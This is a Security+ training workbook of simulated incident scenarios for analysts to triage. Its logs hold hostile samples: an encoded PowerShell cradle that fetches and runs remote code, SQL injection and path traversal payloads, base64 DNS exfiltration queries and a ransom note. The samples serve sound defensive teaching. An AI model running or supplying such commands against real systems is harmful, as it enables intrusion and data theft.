# Deliverable 2.4: Security Incident Analysis Workbook
## NordicShield Technologies Oy

---

```
╔══════════════════════════════════════════════════════════════════╗
║            SECURITY INCIDENT ANALYSIS WORKBOOK                    ║
║                     Hands-On IOC Analysis Lab                     ║
║                                                                    ║
║  Classification: TRAINING EXERCISE                                ║
║  Scenario Type: Red Team Simulation / Threat Intelligence        ║
║  Analyst: [YOUR NAME]                                            ║
╚══════════════════════════════════════════════════════════════════╝
```

---

## Document Purpose

This workbook provides hands-on exercises for analyzing indicators of malicious activity. You will investigate realistic security scenarios based on the Arctic Fox threat campaign targeting NordicShield Technologies. Each exercise simulates real-world incident analysis tasks.

---

## Instructions

1. Approach each scenario as if it were a real incident
2. Document your analysis process, not just conclusions
3. Complete all `[YOUR ANALYSIS]` sections
4. Reference MITRE ATT&CK techniques where applicable
5. Provide actionable recommendations

---

# SECTION A: IOC ANALYSIS FUNDAMENTALS

## A.1 Indicator Types Reference

| Indicator Type | Examples | Reliability | Shelf Life |
|----------------|----------|-------------|------------|
| **Atomic** | IP addresses, domains, email addresses, file hashes | [YOUR INPUT - Explain reliability] | [YOUR INPUT - How long valid?] |
| **Computed** | YARA rules, Snort signatures, behavioral patterns | [YOUR INPUT] | [YOUR INPUT] |
| **Behavioral** | Attack patterns, TTPs, process chains | [YOUR INPUT] | [YOUR INPUT] |

## A.2 Analysis Framework

```
For each incident, follow this analysis framework:

1. INITIAL TRIAGE
   - What type of indicator/activity?
   - What systems are affected?
   - What is the initial severity assessment?

2. CONTEXT GATHERING
   - What additional data supports this finding?
   - Are there related events in logs?
   - Does this match known threat intelligence?

3. IMPACT ASSESSMENT
   - What data/systems are at risk?
   - Has data been exfiltrated?
   - Is there ongoing malicious activity?

4. ROOT CAUSE ANALYSIS
   - How did this activity originate?
   - What vulnerability was exploited?
   - What is the attack timeline?

5. RESPONSE RECOMMENDATION
   - Immediate containment actions
   - Evidence preservation
   - Recovery steps
   - Prevention measures
```

---

# SECTION B: NETWORK-BASED IOC ANALYSIS

## Scenario 1: Suspicious Outbound Connections

### Situation

The NordicShield SOC monitoring system has flagged unusual outbound network connections from the development server (SRV-009, IP: 10.10.5.25). The SIEM has correlated the following events:

**Alert Data:**
```
SIEM Alert ID: NS-ALERT-2026-0142
Timestamp: 2026-01-27 03:42:18 UTC
Alert Type: Anomalous Outbound Connection
Source: SRV-009 (10.10.5.25)
Destination: 185.159.82.47:443
Protocol: HTTPS
Data Volume: 2.3 GB (past 6 hours)
Normal Baseline: <50 MB outbound per day
Process: svchost.exe (PID 4892)
User Context: SYSTEM
```

**Firewall Logs:**
```
2026-01-27 03:42:15 ALLOW TCP 10.10.5.25:49152 -> 185.159.82.47:443
2026-01-27 03:42:16 ALLOW TCP 10.10.5.25:49153 -> 185.159.82.47:443
2026-01-27 03:42:18 ALLOW TCP 10.10.5.25:49154 -> 185.159.82.47:443
... [multiple similar entries]
2026-01-27 09:15:22 ALLOW TCP 10.10.5.25:52891 -> 185.159.82.47:443
```

**DNS Query Logs:**
```
2026-01-27 03:41:58 10.10.5.25 -> update-nordic.com (A record: 185.159.82.47)
2026-01-27 03:41:59 10.10.5.25 -> api.update-nordic.com (A record: 185.159.82.47)
```

**Threat Intelligence:**
```
Domain: update-nordic.com
First Seen: 2026-01-15
Registration: Anonymous registrar
SSL Certificate: Self-signed
VirusTotal: 8/94 vendors flag as malicious
AlienVault OTX: Associated with "Arctic Fox" campaign
```

### Analysis Questions

#### Q1.1: Initial Assessment

```
[YOUR ANALYSIS]

What type of attack does this appear to be?

What MITRE ATT&CK techniques are indicated?
- Technique 1:
- Technique 2:
- Technique 3:

Initial severity assessment (Critical/High/Medium/Low) and why:

```

#### Q1.2: IOC Extraction

```
[YOUR ANALYSIS]

Extract all indicators of compromise from this scenario:

Network IOCs:
- IP Address:
- Domain:
- Port:
- Protocol behavior:

Host IOCs:
- Process:
- PID:
- User context:

Time-based IOCs:
- Active hours:
- Duration:

```

#### Q1.3: Context Analysis

```
[YOUR ANALYSIS]

Why is the development server (SRV-009) a valuable target?
[Consider what's on R&D systems from the company profile]

Why is 3:42 AM UTC significant?
[Consider business hours in Finland]

What does the 2.3 GB data transfer suggest?
[Consider normal baselines]

Why would the attacker use update-nordic.com domain name?
[Consider social engineering aspects]

```

#### Q1.4: Investigation Steps

```
[YOUR ANALYSIS]

List the next 5 investigation steps you would take:

1.

2.

3.

4.

5.

What logs would you request and from which systems?

```

#### Q1.5: Response Recommendations

```
[YOUR ANALYSIS]

Immediate Actions (within 1 hour):
1.
2.
3.

Short-term Actions (within 24 hours):
1.
2.
3.

What evidence should be preserved?

Should this system be isolated? Why or why not?

```

---

## Scenario 2: DNS Anomaly Detection

### Situation

The DNS monitoring system has detected unusual query patterns from multiple IoT gateways.

**Alert Data:**
```
SIEM Alert ID: NS-ALERT-2026-0145
Timestamp: 2026-01-27 14:23:00 UTC
Alert Type: DNS Exfiltration Suspected
Source Devices: IoT-GW-003, IoT-GW-007, IoT-GW-012
Query Pattern: High-entropy subdomains
Destination: data.iot-telemetry-global.net
Query Volume: 15,000 queries in 1 hour (normal: ~200/hour)
```

**Sample DNS Queries:**
```
IoT-GW-003: aGVsbG8gd29ybGQgdGhpcyBpcyBh.data.iot-telemetry-global.net
IoT-GW-003: dGVzdCBvZiBkbnMgZXhmaWx0cmF0.data.iot-telemetry-global.net
IoT-GW-007: aW9uIHRlY2huaXF1ZXMgYmVpbmcg.data.iot-telemetry-global.net
IoT-GW-007: dXNlZCBieSBhZHZhbmNlZCB0aHJl.data.iot-telemetry-global.net
IoT-GW-012: YXQgYWN0b3JzIHRvIGJ5cGFzcyBz.data.iot-telemetry-global.net
```

**Domain Analysis:**
```
Domain: iot-telemetry-global.net
Age: 30 days
Registrant: Privacy protected
Nameservers: ns1.bulletproof-hosting.ru, ns2.bulletproof-hosting.ru
No legitimate business association found
```

### Analysis Questions

#### Q2.1: Attack Identification

```
[YOUR ANALYSIS]

What attack technique is being used?
[Hint: Look at the subdomain patterns]

Decode one of the subdomains (they appear to be Base64):
[ aGVsbG8gd29ybGQgdGhpcyBpcyBh decoded = ]

What does this tell you about the attack?

MITRE ATT&CK Technique:
- T____: 

```

#### Q2.2: Scope Assessment

```
[YOUR ANALYSIS]

How many IoT gateways are affected?

What systems do these gateways connect to?
[Reference the company profile]

What data could be exfiltrated through these gateways?

Why would attackers target IoT gateways for exfiltration?

```

#### Q2.3: Attack Timeline

```
[YOUR ANALYSIS]

Based on the evidence, construct a likely attack timeline:

1. Initial Compromise (estimated):
2. Lateral Movement to IoT network (estimated):
3. DNS exfiltration began:
4. Current status:

What previous alerts might have been missed?

```

#### Q2.4: Detection Gap Analysis

```
[YOUR ANALYSIS]

Why wasn't this detected sooner?

What detection capabilities would have caught this earlier?

What IoT-specific monitoring should be implemented?

```

---

# SECTION C: HOST-BASED IOC ANALYSIS

## Scenario 3: Suspicious Process Activity

### Situation

EDR has flagged suspicious activity on a finance department workstation.

**EDR Alert:**
```
Alert ID: EDR-2026-3847
Timestamp: 2026-01-27 09:15:33 UTC
Severity: High
Hostname: WKS-FIN-042
User: m.virtanen (Finance Manager)
Alert: Suspicious PowerShell Execution

Process Chain:
OUTLOOK.EXE (PID: 3412)
  └─> WINWORD.EXE (PID: 5823)
      └─> cmd.exe (PID: 7891)
          └─> powershell.exe (PID: 8234)

PowerShell Command (encoded):
powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAyADAALgAxAC4AMQA1ADoAOAAwADgAMAAvAGEAJwApAA==
```

**Network Connection (from PowerShell process):**
```
Outbound: 192.20.1.15:8080 (External IP)
Data: HTTP GET request
Response: 50KB payload
```

**File System Activity:**
```
File Created: C:\Users\m.virtanen\AppData\Roaming\Microsoft\svchost.exe
File Size: 287 KB
File Hash (SHA256): 3d5c8e2f7a9b1c4d6e8f0a2b4c6d8e0f1a3b5c7d9e1f3a5b7c9d1e3f5a7b9c1d
VirusTotal: 42/71 detect as malicious (Cobalt Strike Beacon)
```

**Persistence:**
```
Registry Key Added:
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Value: "WindowsUpdate" = "C:\Users\m.virtanen\AppData\Roaming\Microsoft\svchost.exe"
```

### Analysis Questions

#### Q3.1: Attack Chain Analysis

```
[YOUR ANALYSIS]

Map this attack to the cyber kill chain:

1. Reconnaissance:
2. Weaponization:
3. Delivery:
4. Exploitation:
5. Installation:
6. Command & Control:
7. Actions on Objectives:

What is the initial infection vector?

What social engineering technique was likely used?

```

#### Q3.2: PowerShell Analysis

```
[YOUR ANALYSIS]

Decode the Base64 encoded PowerShell command:
[The encoded command decodes to a download cradle]

What does this command do?

Why is "-nop -w hidden" significant?

MITRE ATT&CK Techniques:
- T1059.001: 
- T____: 

```

#### Q3.3: IOC Extraction

```
[YOUR ANALYSIS]

Complete IOC table:

| IOC Type | Value | Context |
|----------|-------|---------|
| File Hash (SHA256) | | Malicious payload |
| IP Address | | C2 server |
| File Path | | Malware location |
| Registry Key | | Persistence |
| Process Name | | Masquerading |
| Domain | | [If any] |

```

#### Q3.4: Scope Determination

```
[YOUR ANALYSIS]

Has this attack spread to other systems? How would you check?

What data is m.virtanen (Finance Manager) likely to have access to?

What is the worst-case scenario if this isn't contained?

What other users might have received the same phishing email?

```

#### Q3.5: Response Plan

```
[YOUR ANALYSIS]

Immediate containment steps:
1.
2.
3.

Evidence to collect:
1.
2.
3.

User communication plan:

When should law enforcement be notified?

```

---

## Scenario 4: Ransomware Indicators

### Situation

Multiple alerts have fired indicating possible ransomware activity.

**Alert Timeline:**
```
09:32:15 - Antivirus: Detected Ryuk.variant [WKS-ENG-015] - QUARANTINED
09:32:18 - File Integrity: Multiple .docx files renamed to .RYK [SRV-003]
09:32:22 - Network: SMB traffic spike from WKS-ENG-015 to SRV-003, SRV-004
09:32:25 - AD Alert: Unusual service account authentication from WKS-ENG-015
09:32:28 - File Integrity: README_DECRYPT.txt created in 47 directories
09:32:31 - Exchange: Mass email sent from compromised service account
09:32:35 - Backup Alert: Backup agent service stopped on SRV-003, SRV-004
09:33:01 - VSS: Shadow copies deleted on multiple servers
```

**Ransom Note (README_DECRYPT.txt):**
```
=== YOUR NETWORK HAS BEEN ENCRYPTED ===

All your files have been encrypted with military-grade encryption.
DO NOT attempt to decrypt files yourself - this will destroy them.
DO NOT contact law enforcement - we are monitoring.
DO NOT hire a recovery company - they will just contact us anyway.

To decrypt your files:
1. Download Tor Browser
2. Navigate to: hxxp://ry2kxxxxxxx.onion
3. Enter your company ID: NS-2026-7834
4. Follow payment instructions

PRICE: 50 BTC ($2,500,000 USD)
Price doubles in 72 hours.
Data will be published to our leak site in 7 days.

We have exfiltrated 500GB of your data including:
- Customer databases
- Financial records
- Employee personal information
- R&D documentation

Proof: [link to sample data]
```

### Analysis Questions

#### Q4.1: Incident Classification

```
[YOUR ANALYSIS]

Incident type:

Ransomware variant (based on indicators):

Is this a single or double extortion attack? Evidence:

MITRE ATT&CK Techniques observed:
1. T1486 - 
2. T1490 - 
3. T1489 - 
4. T____   -
5. T____   -

```

#### Q4.2: Timeline Analysis

```
[YOUR ANALYSIS]

Attack timeline reconstruction:

Initial compromise (estimated - this is NOT the start):

Dwell time before ransomware deployment (estimated):

Ransomware deployment start: 09:32:15

How long before full encryption (estimated):

What happened in the 3 minutes of logged events:
- 09:32:15:
- 09:32:18:
- 09:32:22:
- 09:32:25:
- 09:32:28:
- 09:32:31:
- 09:32:35:
- 09:33:01:

```

#### Q4.3: Impact Assessment

```
[YOUR ANALYSIS]

Systems confirmed affected:
-
-

Systems potentially affected:

Data at risk:
1.
2.
3.
4.

Business operations impacted:

Customer impact:

Compliance/legal implications:
- GDPR:
- NIS2:
- Customer contracts:

```

#### Q4.4: Critical Questions

```
[YOUR ANALYSIS]

Can we trust that backups are intact? Why or why not?

Should NordicShield pay the ransom?
- Arguments for:
- Arguments against:
- Your recommendation:

Is the claim of 500GB exfiltrated data credible? How to verify:

Who needs to be notified?
- Internal:
- External:
- Regulatory:

```

#### Q4.5: Containment Strategy

```
[YOUR ANALYSIS]

Immediate actions (first 15 minutes):
1.
2.
3.
4.
5.

What NOT to do:
1.
2.
3.

Network segmentation actions:

Evidence preservation priorities:

Communication plan:

```

---

# SECTION D: APPLICATION & LOG ANALYSIS

## Scenario 5: Web Application Attack

### Situation

The WAF has blocked multiple malicious requests, but some may have succeeded.

**WAF Logs (Selected):**
```
2026-01-27 11:45:23 BLOCKED 203.0.113.50 POST /api/v2/users/search 
                    SQLi detected: id=1' UNION SELECT * FROM users--
                    
2026-01-27 11:45:25 BLOCKED 203.0.113.50 POST /api/v2/users/search
                    SQLi detected: id=1' UNION SELECT password FROM admin_users--
                    
2026-01-27 11:45:28 ALLOWED 203.0.113.50 POST /api/v2/users/search
                    [No signature match - anomaly only]
                    
2026-01-27 11:45:31 BLOCKED 203.0.113.50 POST /api/v2/users/export
                    Path traversal: filename=../../../etc/passwd

2026-01-27 11:47:15 ALLOWED 203.0.113.50 GET /api/v2/admin/users/export?format=csv
                    Response: 200 OK, Size: 2.3MB
```

**Application Logs:**
```
2026-01-27 11:47:15 INFO  UserController: Export requested by session_id=a8f4c2e1
2026-01-27 11:47:15 WARN  AuthMiddleware: Session a8f4c2e1 has elevated privileges
2026-01-27 11:47:16 INFO  ExportService: Exporting 15,847 user records
2026-01-27 11:47:18 INFO  ExportService: Export complete, 2.3MB file generated
```

**Database Logs:**
```
2026-01-27 11:45:28 Query: SELECT * FROM users WHERE id='1' AND role='admin'--'
2026-01-27 11:45:28 Query returned: 1 row
2026-01-27 11:47:16 Query: SELECT * FROM users [FULL TABLE SCAN - 15,847 rows]
```

### Analysis Questions

#### Q5.1: Attack Analysis

```
[YOUR ANALYSIS]

What type of attack sequence is this?

Which requests were blocked, which succeeded?

What was the successful attack technique?
[Hint: Look at 11:45:28 closely]

How did the attacker bypass the WAF?

What data was exfiltrated?

```

#### Q5.2: Attack Progression

```
[YOUR ANALYSIS]

Map the attack progression:

Step 1 (11:45:23-25): [Reconnaissance/Testing]

Step 2 (11:45:28): [Successful injection]

Step 3 (11:45:31): [Additional attempt]

Step 4 (11:47:15): [Data exfiltration]

What happened between 11:45:31 and 11:47:15?

```

#### Q5.3: Vulnerability Identification

```
[YOUR ANALYSIS]

Primary vulnerability exploited:
- CWE:
- OWASP:

Secondary vulnerability that enabled data access:

Why didn't the WAF catch the successful injection?

Application security failures:
1.
2.
3.

```

#### Q5.4: Data Breach Assessment

```
[YOUR ANALYSIS]

What data was exposed?

Number of affected individuals:

Data categories (check all that apply):
☐ Names
☐ Email addresses
☐ Phone numbers
☐ Passwords/hashes
☐ Financial data
☐ [Other]

Is this a reportable data breach under GDPR?

72-hour notification requirement - when does clock start?

```

---

## Scenario 6: Authentication Anomalies

### Situation

Azure AD has flagged suspicious authentication activity.

**Azure AD Sign-in Logs:**
```
Time(UTC)    User              IP            Location      Status    MFA    Risk
08:15:22    j.korhonen        86.50.xx.xx   Helsinki,FI   Success   Yes    Low
08:47:33    j.korhonen        185.220.xx.xx Stockholm,SE  Success   Yes    Medium
09:02:15    j.korhonen        45.33.xx.xx   New York,US   Success   No     High
09:02:18    j.korhonen        45.33.xx.xx   New York,US   Success   No     High
09:02:21    j.korhonen        45.33.xx.xx   New York,US   Success   No     High
09:03:45    j.korhonen        212.83.xx.xx  London,UK     Success   No     High
09:15:33    j.korhonen        86.50.xx.xx   Helsinki,FI   Success   Yes    Low
```

**Conditional Access Logs:**
```
09:02:15 - Policy "Require MFA" - BYPASSED - Legacy authentication
09:02:18 - Policy "Require MFA" - BYPASSED - Legacy authentication  
09:02:21 - Policy "Require MFA" - BYPASSED - Legacy authentication
09:03:45 - Policy "Block non-compliant devices" - NOT APPLIED - POP3 client
```

**Microsoft 365 Activity:**
```
09:02:45 - j.korhonen - MailItemsAccessed - 847 items
09:05:12 - j.korhonen - Inbox rule created: "Forward all to external"
09:05:15 - Forward destination: j.korhonen.backup@protonmail.com
09:06:33 - j.korhonen - OneDrive: Downloaded Q4_Financial_Report.xlsx
09:07:22 - j.korhonen - OneDrive: Downloaded Customer_List_2026.xlsx
09:08:44 - j.korhonen - SharePoint: Accessed "Board Meeting Minutes"
```

### Analysis Questions

#### Q6.1: Attack Identification

```
[YOUR ANALYSIS]

What type of attack is this?

How did the attacker bypass MFA?

What is the "impossible travel" evidence?

How was the account compromised initially?
[Consider how attacker got credentials that work with legacy auth]

```

#### Q6.2: IOC Extraction

```
[YOUR ANALYSIS]

| IOC Type | Value | Notes |
|----------|-------|-------|
| Malicious IPs | | |
| | | |
| | | |
| Email address | | Exfil destination |
| Inbox rule | | Persistence |
| Client type | | MFA bypass |

```

#### Q6.3: Scope and Impact

```
[YOUR ANALYSIS]

What data did the attacker access?
1.
2.
3.
4.

Total emails accessed:

What is the forwarding rule's purpose?

How long might attacker maintain access even after password reset?

Who else might be affected?

```

#### Q6.4: Response Actions

```
[YOUR ANALYSIS]

Immediate account remediation:
1.
2.
3.
4.
5.

What Azure AD/M365 settings need changing?

How to identify other compromised accounts?

Organizational policy changes needed:

```

---

# SECTION E: IOT/OT INCIDENT ANALYSIS

## Scenario 7: IoT Device Compromise

### Situation

Anomalous behavior detected from IoT devices deployed at a customer site.

**IoT Platform Alerts:**
```
Alert ID: IOT-2026-4521
Site: DataCenter-Munich-01 (Customer: TechCorp GmbH)
Devices: TEMP-SENSOR-214, TEMP-SENSOR-215, TEMP-SENSOR-216
Alert: Firmware version mismatch
Expected: v2.3.1
Actual: v2.3.1-mod

Additional Observations:
- Certificate authentication failing intermittently
- Unusual HTTP traffic to non-authorized endpoints
- Sensor data transmission delays (30-60 second gaps)
```

**Network Traffic Analysis:**
```
Device          Destination          Port    Protocol   Unusual?
TEMP-214        api.nordicsense.fi   8883    MQTTS      Normal
TEMP-214        52.47.xx.xx          443     HTTPS      UNEXPECTED
TEMP-215        api.nordicsense.fi   8883    MQTTS      Normal  
TEMP-215        52.47.xx.xx          443     HTTPS      UNEXPECTED
TEMP-216        52.47.xx.xx          443     HTTPS      UNEXPECTED
```

**Device Logs (retrieved via diagnostic port):**
```
[INFO] 2026-01-26 22:15:33 Firmware update initiated
[INFO] 2026-01-26 22:15:35 Update source: update.nordicsense.fi
[WARN] 2026-01-26 22:15:36 Certificate validation: SKIPPED (override)
[INFO] 2026-01-26 22:15:42 Firmware update complete: v2.3.1-mod
[INFO] 2026-01-26 22:16:00 Device reboot
[INFO] 2026-01-26 22:16:15 Connecting to api.nordicsense.fi:8883
[INFO] 2026-01-26 22:16:18 Connecting to 52.47.xx.xx:443
```

### Analysis Questions

#### Q7.1: Attack Classification

```
[YOUR ANALYSIS]

What type of attack is this?

What was compromised - the device, the update process, or both?

What does "v2.3.1-mod" indicate?

Why was certificate validation skipped?

What MITRE ATT&CK for ICS techniques apply?

```

#### Q7.2: Supply Chain Analysis

```
[YOUR ANALYSIS]

How did malicious firmware get deployed?

What supply chain element was compromised?

Why is this particularly dangerous for NordicShield's business?

What customer data/systems are at risk?

```

#### Q7.3: Scope Determination

```
[YOUR ANALYSIS]

Number of confirmed compromised devices:

How to check if other customer sites are affected:

What could the backdoor be used for?
1.
2.
3.

Could this pivot to customer networks?

```

#### Q7.4: Customer Communication

```
[YOUR ANALYSIS]

Draft a notification summary for the affected customer:

What information must be shared?

What information should NOT be shared yet?

SLA/contractual implications:

```

---

# SECTION F: CORRELATION & SYNTHESIS

## Scenario 8: Multi-Stage Attack Correlation

### Situation

Review the following timeline of events across multiple systems and identify the coordinated attack.

**Consolidated Event Timeline:**
```
Day 1 - 2026-01-22
06:15 UTC - Email: Spear-phishing email received by 5 R&D engineers
           Subject: "NordicSense API Documentation Update"
           Attachment: API_Docs_v3.pdf (malicious)

10:23 UTC - EDR: PDF opened by t.makinen (R&D Engineer)
           Process: AcroRd32.exe spawned cmd.exe

10:24 UTC - EDR: PowerShell download cradle executed
           Download from: cdn-update.nordicsense[.]info

10:25 UTC - EDR: File created: C:\Users\t.makinen\AppData\update.exe
           No AV detection (0-day)

Day 2 - 2026-01-23
02:30 UTC - Network: Beacon traffic from WKS-RD-012 to 185.220.xx.xx
           Pattern: Regular 60-second intervals

Day 3 - 2026-01-24  
14:45 UTC - AD: t.makinen used Mimikatz (detected by behavior)
           Credential dumping from LSASS

14:52 UTC - AD: s.niem Service account used from WKS-RD-012
           Lateral movement to SRV-DEV-001 (Development server)

19:30 UTC - GitHub: Unusual clone activity from SRV-DEV-001
           Repository: nordicsense-core (IP algorithms)
           Full history: 2.1 GB

Day 4 - 2026-01-25
03:15 UTC - Network: Large outbound transfer to 185.220.xx.xx
           Volume: 2.5 GB over 4 hours
           Protocol: HTTPS (encrypted)

Day 5 - 2026-01-26
11:00 UTC - Security Team: Alerts reviewed, investigation began
```

### Analysis Questions

#### Q8.1: Full Attack Reconstruction

```
[YOUR ANALYSIS]

Map this attack to MITRE ATT&CK framework:

| Phase | Tactic | Technique | Evidence |
|-------|--------|-----------|----------|
| Initial Access | | | |
| Execution | | | |
| Persistence | | | |
| Credential Access | | | |
| Lateral Movement | | | |
| Collection | | | |
| Exfiltration | | | |

Attacker dwell time:

```

#### Q8.2: Kill Chain Analysis

```
[YOUR ANALYSIS]

At which kill chain phase could this attack have been stopped?

Phase 1 (Delivery): What control would have helped?

Phase 2 (Exploitation): What control would have helped?

Phase 3 (Installation): What control would have helped?

Phase 4 (C2): What control would have helped?

Phase 5 (Lateral Movement): What control would have helped?

Phase 6 (Exfiltration): What control would have helped?

```

#### Q8.3: Detection Gap Analysis

```
[YOUR ANALYSIS]

Why did it take 4 days to detect?

What alerts were generated but not investigated?

What detection capabilities were missing?

SIEM rules that should have triggered:
1.
2.
3.

```

#### Q8.4: Impact Assessment

```
[YOUR ANALYSIS]

What was stolen?

Business impact of IP theft:

Competitive impact:

Customer impact:

Regulatory implications:

Estimated financial damage:

```

#### Q8.5: Attribution

```
[YOUR ANALYSIS]

Based on TTPs, which threat actor profile matches?
[Reference Deliverable 2.1]

Confidence level (Low/Medium/High):

Supporting evidence:
1.
2.
3.

Alternative hypotheses:

```

---

# SECTION G: EXECUTIVE SUMMARY

```
[YOUR ANALYSIS]

Write a comprehensive executive summary (300-400 words) covering:

1. Overall findings from the analysis exercises
2. Most significant incidents and their business impact
3. Common attack patterns identified
4. Detection and response gaps discovered
5. Priority recommendations for improving detection capabilities
6. Key metrics (time to detect, time to respond, etc.)

```

---

## Document Information

| Field | Value |
|-------|-------|
| **Deliverable** | 2.4 - Security Incident Analysis Workbook |
| **Phase** | 2 - Threats, Vulnerabilities, and Mitigations |
| **Exam Objective** | 2.4 - Given a scenario, analyze indicators of malicious activity |
| **Status** | ⬜ Not Started / 🟡 In Progress / ✅ Complete |
| **Completed By** | [YOUR NAME] |
| **Completion Date** | [DATE] |

---

**Developed by Allyship Security Labs (AllySecLabs)**
*Security+ SY0-701 Capstone Project*
